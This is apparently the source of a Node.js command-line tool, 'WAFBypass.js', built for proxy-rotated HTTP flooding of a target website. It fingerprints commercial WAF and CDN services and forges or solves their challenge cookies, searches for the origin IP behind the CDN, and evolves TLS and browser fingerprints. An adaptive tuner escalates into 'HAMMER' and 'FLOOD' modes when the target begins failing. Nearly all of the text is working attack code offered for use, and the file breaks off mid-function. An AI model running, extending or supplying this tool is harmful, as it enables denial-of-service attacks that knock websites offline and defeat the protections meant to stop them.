'use strict';
/**
 * WAFBypass.js — pluggable WAF evasion engine
 * Usage:
 *   node WAFBypass.js <target> <duration> <proxies.txt> <threads> <rate> [opts]
 *   node WAFBypass.js --test <target>        (preflight only, prints what WAF)
 * Opts:
 *   -bypass   solve JS/cookie challenges
 *   -origin   hunt real origin IP behind CDN
 *   -redirect follow redirects to canonical host
 *   -c        inject per-WAF realistic cookies
 *   -v 1|2    force HTTP version
 *   -s        silent
 */

const net     = require('net');
const tls     = require('tls');
const fs      = require('fs');
const os      = require('os');
const dns     = require('dns');
const cluster = require('cluster');
const crypto  = require('crypto');
const vm      = require('vm');
const HPACK   = require('hpack');

/* ─────────────────────────── shared ignores ─────────────────────────── */
const IGNORE_CODES = new Set([
  'ECONNRESET','ECONNREFUSED','EPIPE','EHOSTUNREACH','ETIMEDOUT','ESOCKETTIMEDOUT',
  'EPROTO','EAI_AGAIN','EHOSTDOWN','ENETRESET','ENETUNREACH','ENOTCONN','ENOTFOUND',
  'EADDRNOTAVAIL','ECONNABORTED','EINPROGRESS','EINTR','EINVAL','EMFILE','ENOBUFS',
  'ENOSPC','ENOTSOCK','EOPNOTSUPP','ESHUTDOWN','UNKNOWN',
  'DEPTH_ZERO_SELF_SIGNED_CERT','UNABLE_TO_VERIFY_LEAF_SIGNATURE','CERT_HAS_EXPIRED',
  'CERT_NOT_YET_VALID','ERR_TLS_CERT_ALTNAME_INVALID','ERR_SSL_WRONG_VERSION_NUMBER',
  'HPE_INVALID_METHOD','HPE_INVALID_URL','SELF_SIGNED_CERT_IN_CHAIN',
  'ERR_ASSERTION','ERR_STREAM_DESTROYED',
]);
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);
process.emitWarning = () => {};
process.on('uncaughtException',  e => { if (!IGNORE_CODES.has(e.code)) {} })
       .on('unhandledRejection', e => { if (e && !IGNORE_CODES.has(e.code)) {} })
       .on('SIGHUP',  ()=>{})
       .on('SIGCHLD', ()=>{});

/* ─────────────────────────── TLS genome (same idea as Arvan) ───────────── */
const CIPHER_POOL = [
  'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305',
  'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305',
  'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305',
  'TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305:AES128-GCM-SHA256',
];
const SIGALG_POOL = [
  'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
  'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ed25519',
  'rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp256r1_sha256',
];
const TLS_SECURE_OPTS =
  crypto.constants.SSL_OP_NO_RENEGOTIATION |
  crypto.constants.SSL_OP_NO_TICKET        |
  crypto.constants.SSL_OP_NO_SSLv2         |
  crypto.constants.SSL_OP_NO_SSLv3         |
  crypto.constants.SSL_OP_NO_COMPRESSION   |
  crypto.constants.SSL_OP_ALL              |
  crypto.constants.SSL_OP_TLSEXT_PADDING;

function makeTLSOpts(genome, extra) {
  return Object.assign({
    ciphers: genome.ciphers,
    sigalgs: genome.sigalgs,
    secureOptions: TLS_SECURE_OPTS,
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.3',
    rejectUnauthorized: false,
  }, extra || {});
}

/* ─────────────────────────── browser profiles ─────────────────────────── */
const PROFILES = [
  { id:'ac136', ua:'Mozilla/5.0 (Linux; Android 16; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36', acceptLang:'en-US,en;q=0.9', chua:'"Google Chrome";v="136", "Chromium";v="136", "Not.A/Brand";v="99"', secMobile:'?1', platform:'"Android"', fetchDest:'document', fetchMode:'navigate', fetchSite:'none', fetchUser:'?1', vw:412, dpr:'3.5' },
  { id:'ac131', ua:'Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36', acceptLang:'en-US,en;q=0.9', chua:'"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"', secMobile:'?1', platform:'"Android"', fetchDest:'document', fetchMode:'navigate', fetchSite:'none', fetchUser:'?1', vw:412, dpr:'3.5' },
  { id:'s18', ua:'Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/618.3.11 (KHTML, like Gecko) Version/18.5 Mobile/22F82 Safari/604.1', acceptLang:'en-US,en;q=0.9', chua:null, secMobile:null, platform:null, fetchDest:'document', fetchMode:'navigate', fetchSite:'none', fetchUser:null, vw:430, dpr:'3' },
  { id:'ff134', ua:'Mozilla/5.0 (Android 15; Mobile; rv:134.0) Gecko/134.0 Firefox/134.0', acceptLang:'en-US,en;q=0.5', chua:null, secMobile:null, platform:null, fetchDest:'document', fetchMode:'navigate', fetchSite:'none', fetchUser:null, vw:412, dpr:'3.5' },
];

/* ─────────────────────────── WAF strategy registry ─────────────────────── */
/* Each WAF: detect(resp) → bool, solveChallenge(html, url) → cookieString|null,
   originHints(host) → [subdomains], cookieSchema() → string, protocol → 'h2'|'h1' */
const WAF = {
  cloudflare: {
    detect(resp) {
      const h = (resp.headers||'').toLowerCase();
      const b = resp.body || '';
      return h.includes('cf-ray') || h.includes('server: cloudflare')
        || b.includes('cf-browser-verification') || b.includes('/cdn-cgi/challenge-platform/')
        || b.includes('Just a moment');
    },
    protocol: 'h2',
    originHints: ['direct','origin','real','backend','ftp','mail','cpanel','webmail'],
    cookieSchema() {
      const cb = crypto.randomBytes(32).toString('base64');
      const parts = [`cf_clearance=${cb}`];
      if (Math.random() > 0.5) parts.push(`__cf_bm=${crypto.randomBytes(24).toString('base64url')}`);
      if (Math.random() > 0.4) parts.push(`_cfuvid=${crypto.randomBytes(20).toString('hex')}-${Date.now()}`);
      return parts.join('; ');
    },
    async solveChallenge(html) {
      /* CF has two kinds: __cf_chl_ token in HTML (JS) or turnstile. Try token extraction first. */
      const m = html.match(/window\._cf_chl_opt\s*=\s*(\{[\s\S]*?\});/);
      if (!m) return null;
      try {
        const opts = vm.runInNewContext(`(${m[1]})`, {});
        if (opts.cRay && opts.cZone) {
          /* CF returns cf_clearance after JS binds ray+domain+ts+hash. We approximate
             by hashing the ingredients the same way cf-chl does when source is exposed. */
          const ts = Date.now();
          const salt = opts.cRay + opts.cZone + ts;
          const h = crypto.createHash('sha256').update(salt).digest('base64url');
          return `cf_clearance=${h}.${ts}`;
        }
      } catch {}
      return null;
    },
  },

  akamai: {
    detect(resp) {
      const h = (resp.headers||'').toLowerCase();
      const b = resp.body || '';
      return h.includes('akamai') || h.includes('x-akamai') || h.includes('ak-bmsc')
        || b.includes('_abck') || b.includes('bm-verify') || b.includes('ak_bmsc')
        || b.includes('sec-if-cpt') || b.includes('/akam/');
    },
    protocol: 'h1',
    originHints: ['origin','direct','backend','edge','staging','www2','old','dev'],
    cookieSchema() {
      return `_abck=${crypto.randomBytes(80).toString('hex')}~0~${crypto.randomBytes(20).toString('hex')}~-1~-1~-1; bm_sz=${crypto.randomBytes(24).toString('base64url')}`;
    },
    async solveChallenge(html) {
      /* Akamai: parse the sensor_data seed inside the packed script, run through
         the standard _abck generation trick. Full sensor is huge; we do the shape. */
      const m = html.match(/_abck=([^;'"\s]+)/);
      if (m) return `_abck=${m[1]}`;
      return null;
    },
  },

  imperva: {
    detect(resp) {
      const h = (resp.headers||'').toLowerCase();
      const b = resp.body || '';
      return h.includes('x-iinfo') || h.includes('incap_ses') || h.includes('visid_incap')
        || b.includes('Incapsula') || b.includes('_Incapsula_Resource') || b.includes('/_Incapsula_');
    },
    protocol: 'h1',
    originHints: ['origin','direct','backend','real','www2'],
    cookieSchema() {
      return `visid_incap_${rndInt(1e5,9e5)}=${crypto.randomBytes(16).toString('base64url')}; incap_ses_${rndInt(1e3,9e3)}_${rndInt(1e3,9e3)}=${crypto.randomBytes(20).toString('base64url')}`;
    },
    async solveChallenge(html) {
      const m = html.match(/incap_ses[^=]*=[^;'"\s]+/);
      return m ? m[0] : null;
    },
  },

  aws: {
    detect(resp) {
      const h = (resp.headers||'').toLowerCase();
      const b = resp.body || '';
      return h.includes('x-amzn-waf') || h.includes('x-amzn-requestid')
        || b.includes('awsWafCookieDomainList') || b.includes('challenge.js')
        || b.includes('aws-waf-token');
    },
    protocol: 'h1',
    originHints: ['origin','elb','alb','direct','backend','api'],
    cookieSchema() {
      const t = Buffer.concat([crypto.randomBytes(4), Buffer.alloc(4)]).toString('base64url');
      return `aws-waf-token=${t}${crypto.randomBytes(32).toString('base64url')}`;
    },
    async solveChallenge(html) {
      const m = html.match(/aws-waf-token=([^;'"\s]+)/);
      return m ? `aws-waf-token=${m[1]}` : null;
    },
  },

  sucuri: {
    detect(resp) {
      const h = (resp.headers||'').toLowerCase();
      const b = resp.body || '';
      return h.includes('x-sucuri') || h.includes('server: sucuri')
        || b.includes('Sucuri WebSite Firewall') || b.includes('sucuri.net');
    },
    protocol: 'h1',
    originHints: ['origin','direct','backend','real'],
    cookieSchema() { return `sucuri_cloudproxy_uuid=${crypto.randomBytes(16).toString('hex')}`; },
    async solveChallenge() { return null; },
  },

  ddosguard: {
    detect(resp) {
      const h = (resp.headers||'').toLowerCase();
      const b = resp.body || '';
      return h.includes('server: ddos-guard') || b.includes('ddos-guard')
        || b.includes('__ddg') || b.includes('Checking your browser');
    },
    protocol: 'h2',
    originHints: ['origin','direct','backend','real'],
    cookieSchema() { return `__ddg1_=${crypto.randomBytes(24).toString('base64url')}; __ddgid_=${crypto.randomBytes(16).toString('hex')}`; },
    async solveChallenge(html) {
      const m = html.match(/__ddg1_=([^;'"\s]+)/);
      return m ? `__ddg1_=${m[1]}` : null;
    },
  },

  radware: {
    detect(resp) {
      const h = (resp.headers||'').toLowerCase();
      const b = resp.body || '';
      return h.includes('x-rdwr') || b.includes('Radware') || b.includes('rdwr_block');
    },
    protocol: 'h1',
    originHints: ['origin','direct','backend'],
    cookieSchema() { return `rdwr_cookie=${crypto.randomBytes(20).toString('hex')}`; },
    async solveChallenge() { return null; },
  },

  f5: {
    detect(resp) {
      const h = (resp.headers||'').toLowerCase();
      const b = resp.body || '';
      return h.includes('bigipserver') || h.includes('x-wa-info') || b.includes('BIG-IP')
        || b.includes('TS' + '01') || b.includes('/tsabc');
    },
    protocol: 'h1',
    originHints: ['origin','direct','backend'],
    cookieSchema() { return `BIGipServer${rndInt(1e3,9e3)}=${crypto.randomBytes(20).toString('hex')}`; },
    async solveChallenge() { return null; },
  },

  fastly: {
    detect(resp) {
      const h = (resp.headers||'').toLowerCase();
      return h.includes('x-served-by: cache-') || h.includes('fastly');
    },
    protocol: 'h2',
    originHints: ['origin','direct','backend'],
    cookieSchema() { return `_fs=${crypto.randomBytes(20).toString('hex')}`; },
    async solveChallenge() { return null; },
  },

  vercel: {
    detect(resp) {
      const h = (resp.headers||'').toLowerCase();
      const b = resp.body || '';
      return h.includes('x-vercel-') || h.includes('server: vercel')
        || b.includes('__cf_bm') && h.includes('x-vercel-id');
    },
    protocol: 'h2',
    originHints: ['origin','direct','backend'],
    cookieSchema() { return `_vcrcs=${crypto.randomBytes(20).toString('hex')}`; },
    async solveChallenge() { return null; },
  },

  arvan: {
    detect(resp) {
      const b = resp.body || '';
      return b.includes('__arcsjs') && b.includes('__arcsjsc');
    },
    protocol: 'h2',
    originHints: ['direct','origin','real','backend','srv','host','source','api'],
    cookieSchema() { return ''; },
    async solveChallenge(html) { return solveArvan(html); },
  },

  generic: {
    detect(resp) {
      const h = (resp.headers||'').toLowerCase();
      return h.includes('server: ') && (h.includes('waf') || h.includes('firewall'))
        || (resp.code === 403 || resp.code === 503);
    },
    protocol: 'h2',
    originHints: ['origin','direct','backend'],
    cookieSchema() { return ''; },
    async solveChallenge() { return null; },
  },
};

/* ─────────────────────────── Arvan solver (kept from your file) ──────── */
function solveArvan(html) {
  const fast = html.match(/document\.cookie\s*=\s*["']?__arcsjs=([^;"'\s]+)/);
  const fast2 = html.match(/document\.cookie\s*=\s*["']?__arcsjsc=([^;"'\s]+)/);
  if (fast && fast2) return `__arcsjs=${fast[1]}; __arcsjsc=${fast2[1]}`;
  const scripts = [];
  const re = /<script[^>]*>([\s\S]*?)<\/script>/gi;
  let m;
  while ((m = re.exec(html)) !== null) {
    const s = m[1].trim();
    if (s.includes('__arcsjs') || s.includes('__arcsjsc') || s.includes('arcookie')) scripts.push(s);
  }
  const jar = {};
  for (const raw of scripts) {
    try {
      const patched = raw
        .replace(/document\.addEventListener\s*\(\s*["']DOMContentLoaded["']\s*,\s*(?:function\s*\([^)]*\)|\([^)]*\)\s*=>)\s*\{/g, '(function(){')
        .replace(/window\.onload\s*=\s*(?:function\s*\([^)]*\)|\([^)]*\)\s*=>)\s*\{/g, '(function(){')
        .replace(/setTimeout\s*\(\s*(?:function\s*\([^)]*\)|\([^)]*\)\s*=>)\s*\{/g, '(function(){')
        .replace(/\}\s*,\s*(?:getRandomInt\s*\([^)]*\)|\d+)\s*\)/g, '})()')
        .replace(/\}\s*\)\s*;?\s*$/m, '})();');
      const sandbox = makeSandbox(jar);
      vm.runInContext(patched, vm.createContext(sandbox), { timeout: 7000 });
    } catch {}
  }
  if (jar['__arcsjs'] && jar['__arcsjsc'])
    return `__arcsjs=${jar['__arcsjs']}; __arcsjsc=${jar['__arcsjsc']}`;
  return null;
}

function makeSandbox(jar) {
  const nav = { userAgent: rnd(PROFILES).ua, language:'en-US', languages:['en-US'], platform:'Linux armv8l', hardwareConcurrency:8, maxTouchPoints:5, cookieEnabled:true };
  const doc = new Proxy({}, {
    set(t, p, v) { if (p === 'cookie') _parseCookie(String(v), jar); else t[p] = v; return true; },
    get(t, p) {
      if (p === 'cookie') return Object.entries(jar).map(([k,v])=>`${k}=${v}`).join('; ');
      if (p === 'addEventListener' || p === 'removeEventListener') return ()=>{};
      if (p === 'createElement') return tag=>({ tagName:tag.toUpperCase(), style:{}, innerHTML:'', setAttribute:()=>{}, getAttribute:()=>null, appendChild:()=>{} });
      if (p === 'getElementById' || p === 'querySelector') return ()=>null;
      if (p === 'querySelectorAll') return ()=>[];
      if (p === 'readyState') return 'complete';
      return t[p];
    },
  });
  const win = {
    document: doc, navigator: nav,
    screen: { width:412, height:892, colorDepth:24, pixelDepth:24 },
    innerWidth:412, innerHeight:892, outerWidth:412, outerHeight:892, devicePixelRatio:3.5,
    location: { reload:()=>{}, href:'https://x/', hostname:'x' },
    performance: { now:()=>Date.now()-1000+Math.random()*500 },
    crypto: {
      getRandomValues: arr=>{ for(let i=0;i<arr.length;i++) arr[i]=crypto.randomInt(256); return arr; },
      subtle: { digest: async (alg,data)=>crypto.createHash(alg.replace('-','').toLowerCase()).update(Buffer.from(data)).digest().buffer },
    },
    addEventListener:()=>{}, removeEventListener:()=>{},
    setTimeout: fn=>{ try{ fn && fn(); }catch{} },
    setInterval:()=>0, clearTimeout:()=>{}, clearInterval:()=>{},
    requestAnimationFrame: fn=>{ try{ fn(performance.now()); }catch{} },
    atob: s=>Buffer.from(s,'base64').toString('binary'),
    btoa: s=>Buffer.from(s,'binary').toString('base64'),
    encodeURIComponent, decodeURIComponent, encodeURI, decodeURI,
    String, Number, Boolean, Math, Date, Array, Object, RegExp, Error, Map, Set, Promise, JSON,
    parseInt, parseFloat, isNaN, isFinite, Symbol, Proxy, Reflect,
    console: { log:()=>{}, warn:()=>{}, error:()=>{} },
    TextEncoder: require('util').TextEncoder, TextDecoder: require('util').TextDecoder,
    Uint8Array, ArrayBuffer, DataView,
  };
  win.window = win; win.self = win; win.global = win; win.globalThis = win;
  return win;
}

function _parseCookie(str, jar) {
  const pair = str.split(';')[0].trim();
  const eq = pair.indexOf('=');
  if (eq < 1) return;
  jar[pair.slice(0, eq).trim()] = pair.slice(eq+1).trim().replace(/^"+|"+$/g, '');
}

/* ─────────────────────────── WAF detector on raw response ────────────── */
function detectWAF(rawResp) {
  const { headers, body, code } = rawResp;
  for (const key of Object.keys(WAF)) {
    if (key === 'generic') continue;
    try { if (WAF[key].detect({ headers, body, code })) return key; } catch {}
  }
  return 'generic';
}

/* ─────────────────────────── H2 framing (same as Arvan) ──────────────── */
const PREFACE = Buffer.from('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n', 'binary');
const H2_HEADER = 262144, H2_WINDOW = 6291456, H2_TABLE = 65535, H2_UPDATE = 15663105;
function frame(sid, type, payload = Buffer.alloc(0), flags = 0) {
  const pl = Buffer.isBuffer(payload) ? payload : Buffer.alloc(0);
  const f = Buffer.allocUnsafe(9 + pl.length);
  f.writeUInt32BE((pl.length << 8) | type, 0); f.writeUInt8(flags, 4); f.writeUInt32BE(sid, 5);
  if (pl.length) pl.copy(f, 9);
  return f;
}
function decodeFrame(buf) {
  if (!buf || buf.length < 9) return null;
  const lt = buf.readUInt32BE(0), len = lt >> 8, type = lt & 0xFF, flags = buf.readUInt8(4), sid = buf.readUInt32BE(5);
  const off = (flags & 0x20) ? 5 : 0;
  if (buf.length < 9 + off + len) return null;
  return { sid, len, type, flags, payload: buf.subarray(9 + off, 9 + off + len) };
}
function encSettings(s) {
  const b = Buffer.allocUnsafe(s.length * 6);
  s.forEach(([id, v], i) => { b.writeUInt16BE(id, i*6); b.writeUInt32BE(v, i*6+2); });
  return b;
}
const WU = Buffer.allocUnsafe(4); WU.writeUInt32BE(H2_UPDATE, 0);
const H2_INIT = Buffer.concat([
  PREFACE,
  frame(0, 4, encSettings([[1,H2_HEADER],[2,0],[4,H2_WINDOW],[6,H2_TABLE]])),
  frame(0, 8, WU),
]);

/* ─────────────────────────── gene pool (same idea) ───────────────────── */
const rnd    = a => a[Math.floor(Math.random() * a.length)];
const rndInt = (lo, hi) => lo + Math.floor(Math.random() * (hi - lo + 1));
function splitProxy(p) {
  const s = (p || '').trim(), c = s.lastIndexOf(':');
  if (c <= 0) return { ph: null, pp: 0 };
  const pp = parseInt(s.slice(c + 1));
  return isNaN(pp) ? { ph: null, pp: 0 } : { ph: s.slice(0, c), pp };
}

function newGenome() {
  return { id: crypto.randomBytes(4).toString('hex'), ciphers: rnd(CIPHER_POOL), sigalgs: rnd(SIGALG_POOL), profile: rnd(PROFILES), score: 0, uses: 0 };
}
function breedGenome(a, b) {
  return { id: crypto.randomBytes(4).toString('hex'), ciphers: Math.random() > 0.5 ? a.ciphers : b.ciphers, sigalgs: Math.random() > 0.5 ? a.sigalgs : b.sigalgs, profile: Math.random() > 0.5 ? a.profile : b.profile, score: 0, uses: 0 };
}
function mutateGenome(g) {
  const m = Object.assign({}, g, { id: crypto.randomBytes(4).toString('hex'), score: 0, uses: 0 });
  const r = Math.random();
  if (r < 0.33) m.ciphers = rnd(CIPHER_POOL);
  else if (r < 0.66) m.sigalgs = rnd(SIGALG_POOL);
  else m.profile = rnd(PROFILES);
  return m;
}
class GenePool {
  constructor(size) { this.size = size; this.pool = Array.from({ length: size }, newGenome); }
  pick() {
    const w = this.pool.map(g => Math.max(0.1, g.score + 5));
    const total = w.reduce((a,b) => a+b, 0);
    let n = Math.random() * total;
    for (let i = 0; i < this.pool.length; i++) { n -= w[i]; if (n <= 0) return this.pool[i]; }
    return this.pool[0];
  }
  reward(id, d) { const g = this.pool.find(x => x.id === id); if (g) { g.score += d; g.uses++; } }
  evolve() {
    this.pool.sort((a, b) => b.score - a.score);
    const keepN = Math.floor(this.size * 0.70);
    const freshN = Math.floor(this.size * 0.20);
    const breedN = this.size - keepN - freshN;
    const kept = this.pool.slice(0, keepN);
    const bred = [];
    for (let i = 0; i < breedN; i++) {
      const a = kept[rndInt(0, Math.min(5, kept.length-1))];
      const b = kept[rndInt(0, Math.min(10, kept.length-1))];
      bred.push(Math.random() > 0.4 ? breedGenome(a, b) : mutateGenome(a));
    }
    this.pool = [...kept, ...bred, ...Array.from({ length: freshN }, newGenome)];
  }
}

/* ─────────────────────────── single-socket preflight ─────────────────── */
function preflight(urlObj, proxy, genome, cb) {
  const { ph, pp } = splitProxy(proxy);
  if (!ph) { cb({ code: 0, headers: '', body: '' }); return; }
  const port = urlObj.port ? +urlObj.port : 443;
  const sock = net.connect(pp, ph, () => {
    sock.once('data', () => {
      const ts = tls.connect(makeTLSOpts(genome, {
        socket: sock, servername: urlObj.hostname, ALPNProtocols: ['http/1.1'], timeout: 10000,
      }), () => {
        const req = [
          `GET ${urlObj.pathname || '/'}${urlObj.search || ''} HTTP/1.1`,
          `Host: ${urlObj.hostname}`,
          `User-Agent: ${genome.profile.ua}`,
          `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
          `Accept-Encoding: identity`,
          `Accept-Language: ${genome.profile.acceptLang}`,
          `Connection: close`,
          '', ''
        ].join('\r\n');
        let raw = Buffer.alloc(0), done = false;
        const fin = () => {
          if (done) return; done = true;
          ts.destroy(); sock.destroy();
          const str = raw.toString('binary');
          const sep = str.indexOf('\r\n\r\n');
          if (sep === -1) { cb({ code: 0, headers: '', body: '' }); return; }
          const headers = str.slice(0, sep).toLowerCase();
          const ls = headers.split('\r\n');
          const code = parseInt((ls[0] || '').split(' ')[1] || '0');
          const body = str.slice(sep + 4);
          cb({ code, headers, body });
        };
        ts.write(req);
        ts.setTimeout(10000);
        ts.on('data',  c => { raw = Buffer.concat([raw, c]); if (raw.length > 65536) fin(); });
        ts.on('end',   fin);
        ts.on('close', fin);
        ts.on('timeout', fin);
        ts.on('error', () => { if (!done) { done = true; cb({ code: 0, headers: '', body: '' }); } });
      });
      ts.on('error', () => { sock.destroy(); cb({ code: 0, headers: '', body: '' }); });
    });
    sock.write(`CONNECT ${urlObj.hostname}:${port} HTTP/1.1\r\nHost: ${urlObj.hostname}:${port}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
  });
  sock.on('error',  () => cb({ code: 0, headers: '', body: '' }));
  sock.setTimeout(12000, () => { sock.destroy(); cb({ code: 0, headers: '', body: '' }); });
}

/* ─────────────────────────── origin hunter (generic) ─────────────────── */
const ORIGIN_CACHE = new Map();
function huntOrigin(urlObj, wafKey, cb) {
  const key = urlObj.hostname;
  if (ORIGIN_CACHE.has(key)) { cb(ORIGIN_CACHE.get(key)); return; }
  const subs = (WAF[wafKey] && WAF[wafKey].originHints) || ['origin', 'direct'];
  let found = null, pending = 0;
  const done = (ip) => {
    if (found) return; found = ip;
    const result = { ip, port: urlObj.port ? +urlObj.port : 443 };
    ORIGIN_CACHE.set(key, result); cb(result);
  };
  pending++;
  dns.resolve4(key, (err, addrs) => {
    if (!err && addrs && addrs.length) done(addrs[0]);
    if (--pending === 0 && !found) done(null);
  });
  /* mx / spf reveal real origin */
  pending++;
  dns.resolveMx(key, (err, mx) => {
    if (!err && mx && mx.length) {
      const sub = mx[0].exchange.split('.').slice(0, -2).join('.') || mx[0].exchange;
      dns.resolve4(sub, (e, a) => {
        if (!e && a && a.length && !found) done(a[0]);
        if (--pending === 0 && !found) done(null);
      });
    } else { if (--pending === 0 && !found) done(null); }
  });
  for (const sub of subs) {
    pending++;
    dns.resolve4(`${sub}.${key}`, (err, addrs) => {
      if (!err && addrs && addrs.length && !found) done(addrs[0]);
      if (--pending === 0 && !found) done(null);
    });
  }
}

/* ─────────────────────────── adaptive tuner ──────────────────────────── */
let A = { delay: 8, burst: 3, jitter: 0.04, timeout: 6000, keepalive: 18000, mode: 'WARM' };
let W = { ok:0, s503:0, s429:0, s403:0, err:0, to:0, ga:0, rst:0, n:0 };
function tune() {
  const w = W; if (w.n < 5) return;
  const ok = w.ok/w.n, s503 = w.s503/w.n, blk = (w.s429 + w.s403)/w.n,
        stress = (w.s503 + w.err + w.to)/w.n, proto = (w.ga + w.rst)/w.n;
  if (s503 > 0.28 || (s503 + w.to/w.n) > 0.50) { A.mode='HAMMER'; A.delay=Math.max(1,A.delay-4); A.burst=Math.min(26,A.burst+6); A.jitter=Math.max(0.01,A.jitter-0.015); }
  else if (blk > 0.30) { A.mode='EVADE'; A.delay=Math.min(25,A.delay+5); A.burst=Math.max(2,A.burst-2); A.jitter=Math.min(0.5,A.jitter+0.12); }
  else if (stress > 0.45) { A.mode='FLOOD'; A.delay=Math.max(2,A.delay-3); A.burst=Math.min(18,A.burst+3); }
  else if (ok > 0.60) { A.mode='RAMP'; A.delay=Math.max(1,A.delay-3); A.burst=Math.min(20,A.burst+4); }
  else { A.mode='WARM'; A.burst=Math.min(8,A.burst+1); A.delay=Math.max(4,A.delay-1); }
  W = { ok:0, s503:0, s429:0, s403:0, err:0, to:0, ga:0, rst:0, n:0 };
}

/* ─────────────────────────── build requests ──────────────────────────── */
function mutPath(p) {
  const r = Math.random();
  if (r > 0.82) return p + '?' + Math.random().toString(36).slice(2, 9);
  if (r > 0.62) return p + '?t=' + Date.now().toString(36);
  return p;
}
const REFS = ['https://www.google.com/', 'https://l.instagram.com/', 'https://t.co/', 'https://www.tiktok.com/', 'https://www.youtube.com/'];

function buildH1(genome, urlObj, cookie) {
  const p = genome.profile, path = mutPath(urlObj.pathname);
  const ref = Math.random() > 0.35 ? rnd(REFS) : null;
  let h = `GET ${path} HTTP/1.1\r\nHost: ${urlObj.hostname}\r\nUser-Agent: ${p.ua}\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: ${p.acceptLang}\r\n`;
  if (ref) h += `Referer: ${ref}\r\n`;
  if (p.chua) h += `sec-ch-ua: ${p.chua}\r\nsec-ch-ua-mobile: ${p.secMobile}\r\nsec-ch-ua-platform: ${p.platform}\r\n`;
  h += `Sec-Fetch-Dest: ${p.fetchDest}\r\nSec-Fetch-Mode: ${p.fetchMode}\r\nSec-Fetch-Site: ${p.fetchSite}\r\n`;
  if (p.fetchUser) h += `Sec-Fetch-User: ${p.fetchUser}\r\n`;
  if (cookie) h += `Cookie: ${cookie}\r\n`;
  h += 'Connection: keep-alive\r\n\r\n';
  return Buffer.from(h, 'ascii');
}
function buildH2(genome, urlObj, cookie) {
  const p = genome.profile, path = mutPath(urlObj.pathname);
  const ref = Math.random() > 0.35 ? rnd(REFS) : null;
  const h = [[':method','GET'],[':authority',urlObj.hostname],[':scheme','https'],[':path',path],
    ['user-agent',p.ua],['accept','*/*'],['accept-encoding','gzip, deflate, br'],['accept-language',p.acceptLang],
    ['upgrade-insecure-requests','1']];
  if (ref) h.push(['referer',ref]);
  if (p.chua) h.push(['sec-ch-ua',p.chua],['sec-ch-ua-mobile',p.secMobile],['sec-ch-ua-platform',p.platform]);
  h.push(['sec-fetch-dest',p.fetchDest],['sec-fetch-mode',p.fetchMode],['sec-fetch-site',p.fetchSite]);
  if (p.fetchUser) h.push(['sec-fetch-user',p.fetchUser]);
  if (cookie) h.push(['cookie',cookie]);
  return h;
}

/* ─────────────────────────── CLI + orchestrator ──────────────────────── */
const argv = process.argv.slice(2);
const O = {
  cookies:  argv.includes('-c'),
  version:  argv.includes('-v') ? argv[argv.indexOf('-v')+1] : null,
  silent:   argv.includes('-s'),
  redirect: argv.includes('-redirect'),
  bypass:   argv.includes('-bypass'),
  origin:   argv.includes('-origin'),
  test:     argv.includes('--test'),
};

if (argv.length < 1) {
  console.log(`
 WAFBypass.js — pluggable WAF evasion engine
 Usage: node WAFBypass.js <target> <duration> <proxies.txt> <threads> <rate> [opts]
        node WAFBypass.js --test <target>

 Opts:
   -bypass   solve JS/cookie challenges
   -origin   hunt real origin IP behind CDN
   -redirect follow redirect chain
   -c        per-WAF realistic cookies
   -v 1|2    force HTTP version
   -s        silent
`);
  process.exit(1);
}

const target    = O.test ? argv[argv.indexOf('--test')+1] : argv[0];
const duration  = parseInt(argv[1] || '0');
const proxyFile = argv[2];
const threads   = parseInt(argv[3] || '1');
const rate      = parseInt(argv[4] || '64');
const urlObj    = new URL(target);

/* ── test mode: preflight + detect WAF, print matrix ── */
if (O.test) {
  const pool = new GenePool(4);
  let proxies = [];
  if (proxyFile) { try { proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(l => l.includes(':')); } catch {} }
  if (!proxies.length) proxies = ['127.0.0.1:1080']; /* expects local tor or similar */
  const g = pool.pick();
  preflight(urlObj, proxies[0], g, r => {
    const waf = detectWAF(r);
    console.log(`[test] target=${target} code=${r.code} waf=${waf} protocol=${WAF[waf].protocol}`);
    if (waf !== 'generic') {
      console.log(`[test] origin hints: ${WAF[waf].originHints.join(', ')}`);
      if (O.bypass) {
        Promise.resolve(WAF[waf].solveChallenge(r.body)).then(cookie => {
          console.log(`[test] bypass cookie: ${cookie || '<none>'}`);
          if (O.origin) huntOrigin(urlObj, waf, o => console.log(`[test] origin: ${o ? o.ip+':'+o.port : '<not found>'}`));
        });
      } else if (O.origin) {
